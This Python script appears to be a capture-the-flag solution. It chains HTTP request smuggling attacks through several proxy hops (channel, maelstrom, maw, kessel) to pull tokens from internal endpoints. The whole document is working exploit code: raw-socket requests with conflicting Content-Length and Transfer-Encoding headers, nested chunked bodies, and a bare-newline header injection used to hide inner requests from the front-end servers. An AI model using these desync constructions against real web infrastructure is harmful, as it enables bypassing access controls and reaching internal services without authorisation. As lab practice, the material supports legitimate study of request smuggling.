import re
import socket

def extractToken(body):
    results = re.findall(r": ([0-9a-f]{12})<\/p>", body)
    return results[0]

def passChannel(innerRequest):
    chunk = "0\r\n\r\n"
    request = f"POST /maelstrom HTTP/1.1\r\n"
    request += "Host: channel.us:8080\r\n"
    request += f"Content-Length: {len(innerRequest) + len(chunk)}\r\n"
    request += "Transfer-Encoding: chunked\r\n"
    request += "Connection: keep-alive\r\n"
    request += f"\r\n{chunk}{innerRequest}"

    return request

def getMaelstromToken():
    request = f"POST /token HTTP/1.1\r\n"
    request += "Host: maelstrom.us:8080\r\n"
    request += "Connection: close\r\n"

    return passChannel(request)

def passMaelstrom(innerRequest):
    innerRequest = "0\r\n\r\n" + innerRequest
    transferEncoding =  f"{len(innerRequest):x}\r\n"
    request = f"POST /maw HTTP/1.1\r\n"
    request += "Host: maelstrom.us:8080\r\n"
    request += "Transfer-Encoding: chunked\r\n"
    request += f"Content-Length: {len(transferEncoding)}\r\n"
    request += "Connection: keep-alive\r\n"
    request += "\r\n" +  transferEncoding + innerRequest + "\r\n" + "0\r\n\r\n"

    return passChannel(request)

def getMawToken():
    request = f"POST /token HTTP/1.1\r\n"
    request += "Host: maw.us:8080\r\n"
    request += "Connection: close\r\n"

    return passMaelstrom(request)

# No passMaw function implemented, as we only need to do it once and the construction isn't as easy to separate

def getKesselToken():
    innerRequest = f"POST /token HTTP/1.1\n"
    innerRequest += "Host: kessel.us:8080\n"
    innerRequest += "Connection: close\r\n\r\n"

    request = f"POST /kessel HTTP/1.1\r\n"
    request += "Host: maw.us:8080\r\n"
    request += "Connection: keep-alive\r\n"
    request += "Fake: fake\n\n" + innerRequest

    return passMaelstrom(request)

def connect(request):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('channel', 8080))

        # print(request)
        s.sendall(request.encode('utf-8'))

        data = s.recv(10000)

        s.close()
        return data.decode()

if __name__ == '__main__':
    print(f"Maelstrom Token: {extractToken(connect(getMaelstromToken()))}")
    print(f"Maw Token: {extractToken(connect(getMawToken()))}")
    print(f"Kessel Token: {extractToken(connect(getKesselToken()))}")


